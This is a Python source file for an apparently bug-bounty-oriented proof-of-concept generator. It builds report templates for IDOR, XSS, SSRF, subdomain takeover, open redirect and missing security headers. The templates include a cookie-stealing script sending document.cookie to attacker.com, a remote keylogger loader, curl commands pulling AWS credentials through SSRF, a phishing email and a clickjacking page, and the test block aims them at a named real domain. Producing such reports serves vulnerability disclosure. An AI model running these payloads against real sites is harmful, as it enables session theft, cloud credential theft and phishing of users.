"""
SecureScope PoC Generator
==========================
Automatically generates Proof of Concept for findings.

WHY THIS IS CRITICAL FOR BUG BOUNTY:
Without PoC → Report rejected or $50 payout
With PoC    → Report accepted → $500-10,000 payout!

Senior hunters ALWAYS include PoC.
This is what separates $50 reports from $5000 reports!
"""

import json
import base64
from datetime import datetime
from urllib.parse import urlparse


class PoCGenerator:
    def __init__(self, target_url):
        self.target = target_url
        self.domain = urlparse(target_url).netloc
        self.pocs = []
        print(f"PoC Generator Ready! Target: {self.target}")

    # ============================================================
    # PoC 1 — IDOR Proof of Concept
    # ============================================================
    def generate_idor_poc(self, endpoint, user_id=1547):
        """
        Generates IDOR proof of concept.
        Shows exactly how to access another user's data.
        """
        victim_id = user_id + 1

        poc = {
            "vulnerability": "Insecure Direct Object Reference (IDOR)",
            "severity": "HIGH",
            "cvss_score": "7.5",
            "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",

            "steps_to_reproduce": [
                f"1. Create account A and note your user ID (e.g. {user_id})",
                f"2. Create account B (ID will be {victim_id})",
                "3. Login as account A",
                f"4. Send GET request to {endpoint.replace('{id}', str(victim_id))}",
                "5. Response contains account B's private data!"
            ],

            "curl_command": f"""curl -X GET \\
  '{self.target}{endpoint.replace('{id}', str(victim_id))}' \\
  -H 'Authorization: Bearer YOUR_TOKEN_HERE' \\
  -H 'Content-Type: application/json'""",

            "python_script": f"""import requests

# Step 1 — Login and get your token
login_resp = requests.post('{self.target}/api/auth/login',
    json={{'email': 'attacker@gmail.com', 'password': 'yourpass'}})
token = login_resp.json().get('token', '')

# Step 2 — Access another user's data (IDOR!)
headers = {{'Authorization': f'Bearer {{token}}'}}
victim_url = '{self.target}{endpoint.replace("{id}", str(victim_id))}'

response = requests.get(victim_url, headers=headers)
print(f'Status: {{response.status_code}}')
print(f'Victim Data: {{response.json()}}')
# If this returns 200 with data = IDOR confirmed!""",

            "impact": [
                f"Access private data of ALL users on {self.domain}",
                "Harvest email addresses and phone numbers",
                "View payment history and personal information",
                "GDPR violation — personal data exposed without consent"
            ],

            "remediation": [
                "Verify requesting user owns the requested resource",
                "Use indirect references instead of sequential IDs",
                "Implement proper authorization middleware",
                "Add audit logging for all data access attempts"
            ]
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # PoC 2 — XSS Proof of Concept
    # ============================================================
    def generate_xss_poc(self, vulnerable_url, parameter, payload=None):
        """
        Generates XSS proof of concept with working HTML page.
        """
        if not payload:
            payload = "<script>alert('XSS_BY_SECURESCOPE')</script>"

        encoded_payload = payload.replace("<", "%3C").replace(">", "%3E")

        poc = {
            "vulnerability": "Cross-Site Scripting (XSS)",
            "severity": "HIGH",
            "cvss_score": "6.1",
            "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",

            "steps_to_reproduce": [
                f"1. Navigate to: {vulnerable_url}",
                f"2. In the '{parameter}' field enter: {payload}",
                "3. Submit the form or press enter",
                "4. JavaScript executes in victim's browser!"
            ],

            "proof_url": f"{vulnerable_url}?{parameter}={encoded_payload}",

            "curl_command": f"""curl -X GET \\
  '{vulnerable_url}?{parameter}={encoded_payload}' \\
  -H 'User-Agent: Mozilla/5.0'""",

            "html_poc": f"""<!DOCTYPE html>
<html>
<head><title>XSS PoC — SecureScope</title></head>
<body>
<h1>XSS Proof of Concept</h1>
<p>Target: {self.target}</p>
<p>Click the link below to trigger XSS:</p>
<a href="{vulnerable_url}?{parameter}={encoded_payload}">
    Click to demonstrate XSS
</a>

<script>
// Advanced PoC — steals cookies
var img = new Image();
img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
// In real bug bounty — use Burp Collaborator instead!
</script>
</body>
</html>""",

            "cookie_stealer_poc": f"""
// This shows impact — stealing session cookie
<script>
fetch('https://YOUR_BURP_COLLABORATOR_URL/?c=' + 
      encodeURIComponent(document.cookie))
</script>

// Inject via: {vulnerable_url}?{parameter}=PAYLOAD_HERE
""",

            "impact": [
                "Execute arbitrary JavaScript in victim's browser",
                "Steal session cookies → Account takeover",
                "Redirect users to phishing pages",
                "Keylog user input including passwords",
                f"Affect all users visiting {self.domain}"
            ],

            "remediation": [
                "Sanitize all user input before displaying",
                "Implement Content Security Policy (CSP) header",
                "Use textContent instead of innerHTML",
                "Encode output using context-aware encoding",
                "Use DOMPurify for sanitizing HTML content"
            ]
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # PoC 3 — SSRF Proof of Concept
    # ============================================================
    def generate_ssrf_poc(self, vulnerable_url, parameter):
        """
        Generates SSRF proof of concept.
        Shows how to access internal cloud metadata!
        """
        poc = {
            "vulnerability": "Server Side Request Forgery (SSRF)",
            "severity": "CRITICAL",
            "cvss_score": "9.3",
            "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",

            "steps_to_reproduce": [
                f"1. Navigate to {vulnerable_url}",
                f"2. Set '{parameter}' parameter to AWS metadata URL",
                "3. Server makes request to internal metadata service",
                "4. AWS credentials returned in response!"
            ],

            "curl_commands": {
                "AWS Metadata": f"""curl -X GET \\
  '{vulnerable_url}?{parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \\
  -H 'User-Agent: Mozilla/5.0'
# If returns AWS role name = SSRF confirmed!""",

                "AWS Credentials": f"""curl -X GET \\
  '{vulnerable_url}?{parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME' \\
  -H 'User-Agent: Mozilla/5.0'
# Returns: AccessKeyId, SecretAccessKey, Token!""",

                "Internal Network": f"""curl -X GET \\
  '{vulnerable_url}?{parameter}=http://192.168.1.1/' \\
  -H 'User-Agent: Mozilla/5.0'
# Scans internal network!"""
            },

            "impact": [
                "Access AWS IAM credentials → Full cloud takeover",
                "Read internal services not exposed to internet",
                "Scan internal network infrastructure",
                "Access databases behind firewall",
                f"Capital One breach used exact same technique!"
            ],

            "remediation": [
                "Validate and whitelist allowed URLs",
                "Block requests to private IP ranges",
                "Disable unnecessary URL fetching features",
                "Use IMDSv2 on AWS (requires session token)",
                "Implement egress filtering on servers"
            ]
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # PoC 4 — Subdomain Takeover PoC
    # ============================================================
    def generate_subdomain_takeover_poc(self, subdomain, service):
        """
        Generates subdomain takeover proof of concept.
        Easy money in bug bounty — $200-2000 per subdomain!
        """
        poc = {
            "vulnerability": "Subdomain Takeover",
            "severity": "HIGH",
            "cvss_score": "8.1",
            "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",

            "steps_to_reproduce": [
                f"1. {subdomain} has DNS CNAME pointing to {service}",
                f"2. The {service} resource no longer exists",
                f"3. Create a new {service} account/repository",
                f"4. Claim {subdomain} by creating matching resource",
                f"5. You now control {subdomain}!"
            ],

            "verification_commands": [
                f"# Check DNS record",
                f"nslookup {subdomain}",
                f"dig CNAME {subdomain}",
                f"",
                f"# Expected output showing dangling CNAME:",
                f"# {subdomain} CNAME {service}",
                f"# {service} NXDOMAIN (does not exist!)"
            ],

            "impact": [
                f"Full control of {subdomain}",
                "Steal cookies set on parent domain",
                "Host phishing pages on trusted subdomain",
                "Bypass Content Security Policy",
                "Send emails from trusted subdomain"
            ],

            "remediation": [
                "Remove DNS record for this subdomain",
                "Implement subdomain monitoring",
                "Delete DNS records before deleting services",
                "Regular audit of DNS records vs active services"
            ]
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # PoC 5 — Open Redirect PoC
    # ============================================================
    def generate_open_redirect_poc(self, vulnerable_url, parameter):
        """
        Generates open redirect proof of concept.
        Used in phishing attacks using trusted domain!
        """
        phishing_url = "https://evil-phishing-site.com"

        poc = {
            "vulnerability": "Open Redirect",
            "severity": "MEDIUM",
            "cvss_score": "6.1",
            "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",

            "steps_to_reproduce": [
                f"1. Craft malicious URL:",
                f"   {vulnerable_url}?{parameter}={phishing_url}",
                "2. Send this URL to victim via email/chat",
                f"3. Victim sees trusted domain ({self.domain})",
                "4. Clicks link → Redirected to phishing site!",
                "5. Victim enters credentials thinking it is legitimate"
            ],

            "malicious_url": f"{vulnerable_url}?{parameter}={phishing_url}",

            "phishing_email_template": f"""Subject: Urgent: Your {self.domain} account needs attention

Dear User,

Please verify your account immediately:
{vulnerable_url}?{parameter}={phishing_url}

This link appears to be from {self.domain} but redirects to attacker!
""",
            "impact": [
                f"Phishing attacks using trusted {self.domain} domain",
                "Users more likely to trust link from known domain",
                "Credential theft via fake login pages",
                "Bypass email security filters"
            ],

            "remediation": [
                "Validate redirect URLs against whitelist",
                "Only allow redirects to same domain",
                "Show warning page before external redirects",
                "Remove redirect functionality if not needed"
            ]
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # PoC 6 — Missing Security Header PoC
    # ============================================================
    def generate_header_poc(self, missing_header, target_url):
        """
        Generates proof of concept for missing security headers.
        Shows REAL attack scenario, not just header missing!
        """
        header_attacks = {
            "X-Frame-Options": {
                "attack": "Clickjacking",
                "poc_html": f"""<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC — SecureScope</title></head>
<body>
<h1>Clickjacking Demonstration</h1>
<p>Victim sees: "Click here to win prize!"</p>
<p>Actually clicking: Hidden {target_url} button</p>

<style>
  iframe {{
    opacity: 0.1;  /* Make target invisible */
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 2;
  }}
  .decoy {{
    position: absolute;
    top: 150px; left: 200px;
    z-index: 1;
    background: green;
    color: white;
    padding: 20px;
    font-size: 24px;
  }}
</style>

<div class="decoy">🎁 Click here to claim prize!</div>
<iframe src="{target_url}"></iframe>
<!-- User clicks "prize" button but actually clicks {target_url}! -->
</body>
</html>"""
            },
            "Content-Security-Policy": {
                "attack": "XSS via missing CSP",
                "poc_html": f"""<!-- Without CSP, this script executes freely -->
<script>
  // Attacker can load external scripts
  var s = document.createElement('script');
  s.src = 'https://attacker.com/keylogger.js';
  document.body.appendChild(s);
</script>
<!-- CSP would block this! -->"""
            },
            "Strict-Transport-Security": {
                "attack": "SSL Stripping",
                "poc_html": f"""# SSL Stripping Attack (requires network position)
# Tool: sslstrip

# 1. Position attacker between victim and server
# 2. Run: sslstrip -l 8080
# 3. Victim's HTTPS → Downgraded to HTTP
# 4. Attacker reads all traffic in plaintext!
# 5. HSTS would prevent this!

# Verify missing HSTS:
curl -I {target_url} | grep -i strict"""
            }
        }

        attack_info = header_attacks.get(
            missing_header,
            {"attack": "Security bypass", "poc_html": "Manual testing required"}
        )

        poc = {
            "vulnerability": f"Missing {missing_header} Header",
            "severity": "MEDIUM",
            "attack_type": attack_info["attack"],
            "poc_code": attack_info["poc_html"],
            "verification": f"curl -I {target_url} | grep -i '{missing_header.lower()}'",
            "impact": f"{attack_info['attack']} attack possible on {self.domain}",
            "remediation": f"Add {missing_header} header to all server responses"
        }

        self.pocs.append(poc)
        return poc

    # ============================================================
    # Generate All PoCs for Scan Findings
    # ============================================================
    def generate_pocs_for_findings(self, findings):
        """
        Automatically generates appropriate PoC
        for each finding from scan results.
        """
        print("\n[*] Generating PoCs for all findings...")
        generated = 0

        for finding in findings:
            finding_type = finding.get("type", "").lower()
            url = finding.get("url", self.target)

            try:
                if "idor" in finding_type:
                    poc = self.generate_idor_poc("/api/user/{id}")
                    finding["poc"] = poc
                    generated += 1

                elif "xss" in finding_type or "cross-site scripting" in finding_type:
                    poc = self.generate_xss_poc(url, "q")
                    finding["poc"] = poc
                    generated += 1

                elif "ssrf" in finding_type:
                    poc = self.generate_ssrf_poc(url, "url")
                    finding["poc"] = poc
                    generated += 1

                elif "subdomain takeover" in finding_type:
                    subdomain = urlparse(url).netloc
                    poc = self.generate_subdomain_takeover_poc(
                        subdomain, "GitHub Pages"
                    )
                    finding["poc"] = poc
                    generated += 1

                elif "open redirect" in finding_type:
                    poc = self.generate_open_redirect_poc(url, "redirect")
                    finding["poc"] = poc
                    generated += 1

                elif "missing security header" in finding_type:
                    header = finding.get("detail", "").split(":")[0]
                    poc = self.generate_header_poc(header, url)
                    finding["poc"] = poc
                    generated += 1

            except Exception:
                pass

        print(f"[+] Generated {generated} PoCs for findings!")
        return findings

    # ============================================================
    # Export PoCs to File
    # ============================================================
    def export_pocs(self, filename=None):
        """Exports all PoCs to JSON file for reference."""
        import os
        
        # Create pocs folder if not exists
        pocs_dir = "pocs"
        os.makedirs(pocs_dir, exist_ok=True)
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{pocs_dir}/pocs_{self.domain}_{timestamp}.json"

        with open(filename, "w") as f:
            json.dump({
                "target": self.target,
                "generated_at": datetime.now().isoformat(),
                "total_pocs": len(self.pocs),
                "pocs": self.pocs
            }, f, indent=2)

        print(f"[+] PoCs exported to: {filename}")
        return filename


if __name__ == "__main__":
    generator = PoCGenerator("https://sharpener.tech")

    print("\n--- Testing PoC Generation ---")

    # Test IDOR PoC
    print("\n[1] IDOR PoC:")
    idor_poc = generator.generate_idor_poc("/api/user/{id}", 1547)
    print(f"Vulnerability: {idor_poc['vulnerability']}")
    print(f"CVSS Score: {idor_poc['cvss_score']}")
    print("\nSteps to Reproduce:")
    for step in idor_poc["steps_to_reproduce"]:
        print(f"  {step}")
    print("\ncURL Command:")
    print(idor_poc["curl_command"])

    # Test XSS PoC
    print("\n[2] XSS PoC:")
    xss_poc = generator.generate_xss_poc(
        "https://sharpener.tech/search", "q"
    )
    print(f"Vulnerability: {xss_poc['vulnerability']}")
    print(f"Proof URL: {xss_poc['proof_url']}")

    # Test SSRF PoC
    print("\n[3] SSRF PoC:")
    ssrf_poc = generator.generate_ssrf_poc(
        "https://sharpener.tech/fetch", "url"
    )
    print(f"Vulnerability: {ssrf_poc['vulnerability']}")
    print(f"CVSS Score: {ssrf_poc['cvss_score']}")

    # Export all PoCs
    generator.export_pocs()
    print("\n✅ PoC Generator working correctly!")